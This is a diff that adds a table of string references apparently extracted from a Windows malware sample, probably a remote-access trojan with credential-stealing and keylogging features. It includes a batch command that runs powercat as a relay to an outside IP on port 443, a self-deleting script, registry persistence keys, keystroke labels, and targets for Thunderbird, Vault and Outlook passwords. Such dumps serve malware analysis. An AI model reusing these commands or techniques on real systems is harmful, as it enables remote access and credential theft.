@@ -1,0 +1,254 @@
+reference_vaddr	symbol_addr	symbol_type	caller_function	data
+0x401026	0x424c80	string	0x401000	%s\a%s
+0x401395	0x424c88	string	0x40136c	%ComSpec%
+0x4013af	0x424c92	string	0x40136c	%s /K chcp 65001
+0x4013e7	0x424ca3	string	0x40136c	%WINDIR%
+0x401401	0x424cac	string	0x40136c	%s\system32\cmd.exe /K chcp 65001
+0x401445	0x424c88	string	0x40136c	%ComSpec%
+0x401494	0x424ca3	string	0x40136c	%WINDIR%
+0x4014ae	0x424cd1	string	0x40136c	%s\system32\cmd.exe
+0x401f84	0x424ce8	string	0x401f5f	CONNECT %s:%d HTTP/1.0\r\nHost: %s:%d\r\n\r\n
+0x402058	0x424d10	string	0x401f5f	200 OK
+0x4026e3	0x424d18	string	0x402684	checkip.dyndns.org
+0x402775	0x424d2c	string	0x402684	GET / HTTP/1.1\r\nHost: checkip.dyndns.org\r\n\r\n
+0x40280e	0x424d59	string	0x402684	Current IP Address:
+0x403768	0x4251e0	string	0x40361c	Xd/%.2d/%.2d %.2d:%.2d:%.2d
+0x403873	0x425218	string	0x40361c	%d\a%s\a%s\a
+0x403910	0x42522c	string	0x40361c	%d\a%s\a%I64u\a%s\a
+0x403a99	0x42524c	string	0x403a37	hyd7u5jdi8
+0x403cbb	0x425264	string	0x403a37	%d/%.2d/%.2d %.2d:%.2d:%.2d
+0x403d17	0x42529c	string	0x403a37	%d\a%s\a%s\a%s\a
+0x403e12	0x4252b8	string	0x403a37	%d\a%s\a%I64u\a%s\a%s\a
+0x403efa	0x4252de	string	0x403a37	%s%s\
+0x404a3e	0x42524c	string	0x40495b	hyd7u5jdi8
+0x404a86	0x4252ea	string	0x40495b	shell32.dll
+0x4055e3	0x425300	string	0x4055c8	d %d\a p:// s%s\a%s
+0x405783	0x425318	string	0x4056d1	%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8\r\nConnection: close\r\n\r\n
+0x405898	0x425410	string	0x4056d1	200 OK
+0x4058be	0x425417	string	0x4056d1	\r\n\r\n
+0x405cad	0x425420	string	0x405ab3	%TEMP%
+0x405d1e	0x425427	string	0x405ab3	hyd7u5jdi8
+0x40602c	0x425420	string	0x405ab3	%TEMP%
+0x406058	0x425432	string	0x405ab3	\ s %s
+0x406120	0x42543b	string	0x405ab3	%s\%s
+0x406575	0x425441	string	0x405ab3	%s\*
+0x406634	0x425446	string	0x405ab3	%s\a%d
+0x4073a8	0x4255bc	string	0x407361	84.200.2.12:443;
+0x407400	0x41b020	string	0x4073e8	function powercat\n{\n param(\n [alias("Client")][string]$c="",\n [alias("Listen")][switch]$l=$False,\n [alias("Port")][Parameter(Position=-1)][string]$p="",\n [alias("Execute")][string]$e="",\n [alias("ExecutePowershell")][switch]$ep=$False,\n [alias("Relay")][string]$r="",\n [alias("UDP")][switch]$u=$False,\n [alias("dnscat2")][string]$dns="",\n [alias("DNSFailureThreshold")][int32]$dnsft=10,\n [alias("Timeout")][int32]$t=60,\n [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,\n [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",\n [alias("OutputFile")][string]$of="",\n [alias("Disconnect")][switch]$d=$False,\n [alias("Repeater")][switch]$rep=$False,\n [alias("GeneratePayload")][switch]$g=$False,\n [alias("GenerateEncoded")][switch]$ge=$False,\n [alias("Help")][switch]$h=$False\n )\n\n ############### HELP ###############\n $Help = "\npowercat - Netcat, The Powershell Version\nGithub Repository: https://github.com/besimorhino/powercat\n\nThis script attempts to implement the features of netcat in a powershell\nscript. It also contains extra features such as built-in relays, execute\npowershell, and a dnscat2 client.\n\nUsage: powercat [-c or -l] [-p port] [options]\n\n -c <ip> Client Mode. Provide the IP of the system you wish to connect to.\n If you are using -dns, specify the DNS Server to send queries to.\n\n -l Listen Mode. Start a listener on the port specified by -p.\n\n -p <port> Port. The port to connect to, or the port to listen on.\n\n -e <proc> Execute. Specify the name of the process to start.\n\n -ep Execute Powershell. Start a pseudo powershell session. You can\n declare variables and execute commands, but if you try to enter\n another shell (nslookup, netsh, cmd, etc.) the shell will hang.\n\n -r <str> Relay. Used for relaying network traffic between two nodes.\n Client Re
+0x407420	0x4240a0	string	0x4073e8	@echo off\r\n:loop\r\ncmd.exe /c powershell; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force;. "%s"; powercat -l -p 4000 -r tcp:84.200.2.12:443; \r\ngoto :loop
+0x407462	0x4255e5	string	0x4073e8	%TEMP%\powercat.ps1
+0x4074d6	0x4255f9	string	0x4073e8	%TEMP%\loopc.cmd
+0x40756a	0x42560a	string	0x4073e8	/c "%s"
+0x40759a	0x425612	string	0x4073e8	C:\Windows\system32\cmd.exe
+0x4075c0	0x42562e	string	0x4075b3	psapi.dll
+0x4075cc	0x425638	string	0x4075b3	GetModuleFileNameExA
+0x4075e5	0x42564d	string	0x4075b3	KERNEL32.DLL
+0x4075f1	0x425638	string	0x4075b3	GetModuleFileNameExA
+0x40764e	0x42565a	string	0x4075b3	ns.exe
+0x40780e	0x425662	string	0x4076b4	System
+0x4078f3	0x4256a4	string	0x4078db	@echo off\r\nping 192.0.2.2 -n 1 -w %d >nul 2>&1\r\ndel /s "%s" >nul 2>&1\r\ncall :%s&exit /b\r\n:%s\r\nstart /b "" cmd /c del "%%~f0"&exit /b\r\n
+0x4079d7	0x425683	string	0x4078db	s %s. md
+0x407b5f	0x42568d	string	0x4078db	%ComSpec%
+0x407b83	0x425697	string	0x4078db	%s /c "%s"
+0x407bdc	0x42572b	string	0x407bd6	KERNEL32.DLL
+0x407bed	0x425738	string	0x407bd6	SetThreadExecutionState
+0x407f08	0x425753	string	0x407e74	TFrmMain
+0x407fb1	0x42575c	string	0x407e74	Microsoft Windows
+0x407fb9	0x425753	string	0x407e74	TFrmMain
+0x40823f	0x42576e	string	0x4080a5	-m "%s"
+0x40830e	0x425776	string	0x4080a5	/c copy "%s+" "%s"
+0x40833e	0x425789	string	0x4080a5	C:\Windows\system32\cmd.exe
+0x40840a	0x4257a8	string	0x4080a5	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
+0x408483	0x4257d8	string	0x4080a5	SOFTWARE\Microsoft\Active Setup\Installed Components\%s\
+0x4084ab	0x425812	string	0x4080a5	"%s"
+0x4084e7	0x42581c	string	0x4080a5	StubPath
+0x4085b2	0x4257a8	string	0x408591	SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
+0x40861c	0x425828	string	0x408591	SOFTWARE\Microsoft\Active Setup\Installed Components
+0x408694	0x425892	string	0x408591	default.conf
+0x408d54	0x425892	string	0x408cc7	default.conf
+0x408eb9	0x42589f	string	0x408cc7	hyd7u5jdi8
+0x409057	0x425892	string	0x408fcf	default.conf
+0x409257	0x4258ac	string	0x409248	SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+0x4092c1	0x425914	string	0x409248	%s\%s
+0x409365	0x425920	string	0x409248	DisplayName
+0x4093ac	0x425938	string	0x409248	UninstallString
+0x40940d	0x425958	string	0x409248	DisplayVersion
+0x40946e	0x425976	string	0x409248	Publisher
+0x4094cf	0x42598c	string	0x409248	QuietUninstallString
+0x409538	0x4259b8	string	0x409248	%s\a%s\a%s\a%s\a%s\a
+0x409a9a	0x4259d8	string	0x409a44	Secur32.dll
+0x409ab8	0x4259e4	string	0x409a44	LsaGetLogonSessionData
+0x409ad3	0x4259fb	string	0x409a44	LsaFreeReturnBuffer
+0x409aee	0x425a0f	string	0x409a44	LsaEnumerateLogonSessions
+0x409c85	0x425a2c	string	0x409a44	%lu\a%s\a%s\a%s\a%.2d/%.2d/%d %.2d:%.2d:%.2d\a%s\a
+0x40a271	0x425a88	string	0x40a19c	psapi.dll
+0x40a27d	0x425a92	string	0x40a19c	GetModuleFileNameExW
+0x40a290	0x425aa7	string	0x40a19c	ERNEL32.DLL
+0x40a2f1	0x425a92	string	0x40a19c	GetModuleFileNameExW
+0x40a448	0x425ab4	string	0x40a19c	d/%. d/%d %.2d:%.2d:%.2d
+0x40a564	0x425aec	string	0x40a19c	% \a%s\a%s\a
+0x40a93c	0x425b0c	string	0x40a933	winhttp.dll
+0x40a948	0x425b18	string	0x40a933	WinHttpOpen
+0x40a95b	0x425b0c	string	0x40a933	winhttp.dll
+0x40a967	0x425b24	string	0x40a933	WinHttpGetProxyForUrl
+0x40a97a	0x425b0c	string	0x40a933	winhttp.dll
+0x40a986	0x425b3a	string	0x40a933	WinHttpCloseHandle
+0x40a9d7	0x425b4e	string	0x40a933	InternetProxy
+0x40aa61	0x425b6c	string	0x40a933	http://www.google.com
+0x40aae1	0x425b98	string	0x40a933	t p=
+0x40ac1f	0x425b9e	string	0x40a933	socks=
+0x40ad1b	0x425b0c	string	0x40a933	winhttp.dll
+0x40ad27	0x425ba8	string	0x40a933	WinHttpGetIEProxyConfigForCurrentUser
+0x40adbf	0x425b98	string	0x40a933	t p=
+0x40aefd	0x425b9e	string	0x40a933	socks=
+0x40df4b	0x425bd0	string	0x40df42	UserName
+0x40df9b	0x425bdd	string	0x40df42	advapi32.dll
+0x40dfee	0x425bea	string	0x40df42	%USERNAME%
+0x40e0ec	0x425bf5	string	0x40e057	KERNEL32.DLL
+0x40e0f8	0x425c02	string	0x40e057	GetNativeSystemInfo
+0x40e38e	0x425c16	string	0x40e057	ProductType
+0x40e396	0x425c24	string	0x40e057	SYSTEM\CurrentControlSet\Control\ProductOptions
+0x40e3bc	0x425c54	string	0x40e057	WINNT
+0x40e3eb	0x425c5a	string	0x40e057	LANMANNT
+0x40e405	0x425c63	string	0x40e057	SERVERNT
+0x40e4e0	0x425bf5	string	0x40e494	KERNEL32.DLL
+0x40e4ec	0x425c8f	string	0x40e494	GlobalMemoryStatusEx
+0x40e56e	0x425ca4	string	0x40e540	ProcessorNameString
+0x40e576	0x425cb8	string	0x40e540	HARDWARE\DESCRIPTION\System\CentralProcessor\0
+0x40e624	0x425ce7	string	0x40e58d	hyd7u5jdi8
+0x40e669	0x425bdd	string	0x40e58d	advapi32.dll
+0x40e675	0x425cf2	string	0x40e58d	AllocateAndInitializeSid
+0x40e688	0x425bdd	string	0x40e58d	advapi32.dll
+0x40e6ab	0x425bdd	string	0x40e58d	advapi32.dll
+0x40e6b7	0x425d0b	string	0x40e58d	FreeSid
+0x40e853	0x425d13	string	0x40e7c0	%d/%.2d/%.2d %.2d:%.2d:%.2d
+0x40e87b	0x425bf5	string	0x40e875	KERNEL32.DLL
+0x40e887	0x425d2f	string	0x40e875	IsWow64Process
+0x40e9d4	0x425d3e	string	0x40e8d3	%PATH%
+0x40e9f2	0x425d45	string	0x40e8d3	%WINDIR%
+0x40eb9e	0x425d50	string	0x40e8d3	%s\a%d\a%s\a%s\a%s\a%I64u\a%I64u\a%I64u\a%c\a%s\a%s\a%s\a%s\a%d\a%s\a%d\a%s\a%d\a%d\a%s\a%d\a%s\a%d\a%s\a%d\a
+0x40efeb	0x425da8	string	0x40ef39	hyd7u5jdi8
+0x40f124	0x425dbe	string	0x40ef39	%d:%s%s;
+0x40f1c6	0x425dd0	string	0x40ef39	%s%s\
+0x40f256	0x425dd6	string	0x40ef39	%u:%I64u:%s%s;
+0x40f5ac	0x425df4	string	0x40f4e2	%I64u
+0x40f686	0x425df4	string	0x40f4e2	%I64u
+0x40f895	0x425df4	string	0x40f4e2	%I64u
+0x40fd5f	0x425dfc	string	0x40fcec	%d\a%s\a%lu\a
+0x410b3e	0x425e1c	string	0x410624	hyd7u5jdi8
+0x410c60	0x425e32	string	0x410624	%s/%s
+0x410cfe	0x425e3e	string	0x410624	%s%s\
+0x410d95	0x425e4a	string	0x410624	%s%s
+0x413711	0x425ec0	string	0x4136f4	iphlpapi.dll
+0x41371d	0x425ecd	string	0x4136f4	GetExtendedTcpTable
+0x413730	0x425ec0	string	0x4136f4	iphlpapi.dll
+0x41373c	0x425ee1	string	0x4136f4	GetExtendedUdpTable
+0x41374f	0x425ef5	string	0x4136f4	psapi.dll
+0x41375b	0x425eff	string	0x4136f4	GetProcessImageFileNameW
+0x413774	0x425f18	string	0x4136f4	KERNEL32.DLL
+0x413780	0x425eff	string	0x4136f4	GetProcessImageFileNameW
+0x4138c4	0x425f26	string	0x4136f4	%S:%u
+0x413942	0x425f26	string	0x4136f4	%S:%u
+0x4139e2	0x425f34	string	0x4136f4	%s\a%d\aTCP\a%s\a%s\a%d\a
+0x413b5d	0x425f5c	string	0x4136f4	%S:%d
+0x413bd9	0x425f68	string	0x4136f4	%s\a%d\aUDP\a%s\a*:*\a-\a
+0x4159ec	0x425ff4	string	0x415942	\r\n\r\n[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\r\n
+0x415a9b	0x42604a	string	0x415a3e	{Backspace}
+0x415ac1	0x426062	string	0x415a3e	{Return}
+0x415ae7	0x426074	string	0x415a3e	{Tab}
+0x415b0d	0x426080	string	0x415a3e	{Arrow Left}
+0x415b33	0x42609a	string	0x415a3e	{Arrow Up}
+0x415b59	0x4260b0	string	0x415a3e	{Arrow Right}
+0x415b7f	0x4260cc	string	0x415a3e	{Arrow Down}
+0x415ba5	0x4260e6	string	0x415a3e	{Home}
+0x415bcb	0x4260f4	string	0x415a3e	{Page Up}
+0x415bf1	0x426108	string	0x415a3e	{Page Down}
+0x415c17	0x426120	string	0x415a3e	{End}
+0x415c3d	0x42612c	string	0x415a3e	{Break}
+0x415c63	0x42613c	string	0x415a3e	{Delete}
+0x415c89	0x42614e	string	0x415a3e	{Insert}
+0x415caf	0x426160	string	0x415a3e	{Print Screen}
+0x415cd5	0x42617e	string	0x415a3e	{Scroll Lock}
+0x415cfb	0x42619a	string	0x415a3e	{Caps Lock}
+0x415d21	0x4261b2	string	0x415a3e	{Alt}
+0x415d47	0x4261be	string	0x415a3e	{Esc}
+0x415e19	0x4261ca	string	0x415a3e	{Ctrl+%c}
+0x415ee3	0x4261ca	string	0x415a3e	{Ctrl+%c}
+0x4161be	0x426418	string	0x416128	hyd7u5jdi8
+0x416292	0x426418	string	0x416128	hyd7u5jdi8
+0x4162da	0x426423	string	0x416128	user32.dll
+0x416317	0x426423	string	0x416128	user32.dll
+0x4166be	0x42642e	string	0x41665b	%.2d-%.2d-%.4d
+0x416869	0x426499	string	0x416858	hyd7u5jdi8
+0x416b97	0x4264a4	string	0x416b1b	Path=
+0x416dd9	0x4264ac	string	0x416d41	mozutils.dll
+0x416e1e	0x4264b9	string	0x416d41	mozglue.dll
+0x4170b3	0x4264c7	string	0x417070	APPDATA
+0x417109	0x4264c7	string	0x417070	APPDATA
+0x41714f	0x4264cf	string	0x417070	Mozilla Thunderbird
+0x417166	0x4264c7	string	0x417070	APPDATA
+0x417176	0x4264e3	string	0x417070	%s\Thunderbird\profiles.ini
+0x4171bc	0x4264c7	string	0x417070	APPDATA
+0x4171d8	0x4264ff	string	0x417070	%s\Thunderbird\%s
+0x41724a	0x426511	string	0x417070	NSS_Init
+0x41726a	0x42651a	string	0x417070	PK11_GetInternalKeySlot
+0x41728a	0x426532	string	0x417070	PK11_Authenticate
+0x4172aa	0x426544	string	0x417070	NSSBase64_DecodeBuffer
+0x4172ca	0x42655b	string	0x417070	PK11SDR_Decrypt
+0x4172ea	0x42656b	string	0x417070	PK11_FreeSlot
+0x41730a	0x426579	string	0x417070	NSS_Shutdown
+0x41732a	0x426586	string	0x417070	sqlite3_open
+0x41734a	0x426593	string	0x417070	sqlite3_close
+0x41736a	0x4265a1	string	0x417070	sqlite3_prepare_v2
+0x41738a	0x4265b4	string	0x417070	sqlite3_step
+0x4173aa	0x4265c1	string	0x417070	sqlite3_column_text
+0x417d24	0x4265d6	string	0x417be1	%.2X
+0x417d5d	0x4265d6	string	0x417be1	%.2X
+0x418149	0x4265e0	string	0x418133	advapi32.dll
+0x418435	0x4265f0	string	0x41835a	Software\Microsoft\Internet Explorer\IntelliForms\Storage2
+0x4187f1	0x426666	string	0x4187d0	%s\*.*
+0x4188f1	0x426672	string	0x4187d0	index.dat
+0x418a4f	0x42667c	string	0x418986	vaultcli.dll
+0x418a6d	0x426689	string	0x418986	VaultOpenVault
+0x418a88	0x426698	string	0x418986	VaultCloseVault
+0x418aa3	0x4266a8	string	0x418986	VaultEnumerateItems
+0x418abe	0x4266bc	string	0x418986	VaultGetItem
+0x418ad9	0x4266bc	string	0x418986	VaultGetItem
+0x418af4	0x4266c9	string	0x418986	VaultFree
+0x41913f	0x4266d3	string	0x419119	History
+0x4193dd	0x4266db	string	0x419234	%c%s\a%s\a%s\b\b\b\b
+0x41987f	0x4264c7	string	0x419876	APPDATA
+0x419939	0x4266ec	string	0x41992a	Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+0x4199a6	0x426767	string	0x41992a	%s\%s
+0x419a25	0x42676d	string	0x41992a	Email
+0x419a5c	0x426773	string	0x41992a	POP3 User
+0x419a8f	0x42677d	string	0x41992a	POP3 Server
+0x419abe	0x426789	string	0x41992a	POP3 Password
+0x419af9	0x426797	string	0x41992a	IMAP User
+0x419b2c	0x4267a1	string	0x41992a	IMAP Server
+0x419b5b	0x4267ad	string	0x41992a	IMAP Password
+0x419b96	0x4267bb	string	0x41992a	HTTP User
+0x419bc9	0x4267c5	string	0x41992a	HTTP Server
+0x419bf8	0x4267d1	string	0x41992a	HTTP Password
+0x419c33	0x4267df	string	0x41992a	SMTP User
+0x419c66	0x4267e9	string	0x41992a	SMTP Server
+0x419c95	0x4267f5	string	0x41992a	SMTP Password
+0x419d9f	0x426803	string	0x41992a	%c%c%S\a%S\a%S\a%S\b\b\b\b
+0x41a448	0x426830	string	0x41a43f	HLWAPI.DLL
+0x41a497	0x42683c	string	0x41a43f	SHDeleteKeyW
+0x41a4e0	0x42684a	string	0x41a43f	%s\%s
+0x41a559	0x426856	string	0x41a528	%u\a%s\a
+0x41a7a5	0x42686c	string	0x41a528	%s\a%d\a%d\a
+0x41ac00	0x44e4a4	import	0x41ac00	KERNEL32.dll.Process32NextW
+0x41ac08	0x44e4a0	import	0x41ac08	KERNEL32.dll.Process32Next
+0x41ac10	0x44e49c	import	0x41ac10	KERNEL32.dll.Process32FirstW
+0x41ac18	0x44e498	import	0x41ac18	KERNEL32.dll.Process32First
+0x41ac20	0x44e3f0	import	0x41ac20	KERNEL32.dll.CreateToolhelp32Snapshot
+0x41ac28	0x44e500	import	0x41ac28	msvcrt.dll.strstr
+0x41ac30	0x44e4fc	import	0x41ac30	msvcrt.dll.strlen
+0x41ac38	0x44e4f8	import	0x41ac38	msvcrt.dll.realloc
+0x41ac40	0x44e4f4	import	0x41ac40	msvcrt.dll.memcpy
+0x41ac48	0x44e4f0	import	0x41ac48	msvcrt.dll.malloc
+0x41ac50	0x44e4ec	import	0x41ac50	msvcrt.dll.getenv
+0x41ac58	0x44e4e8	import	0x41ac58	msvcrt.dll.free
+0x41ac60	0x44e5bc	import	0x41ac60	WS2_32.dll.__WSAFDIsSet
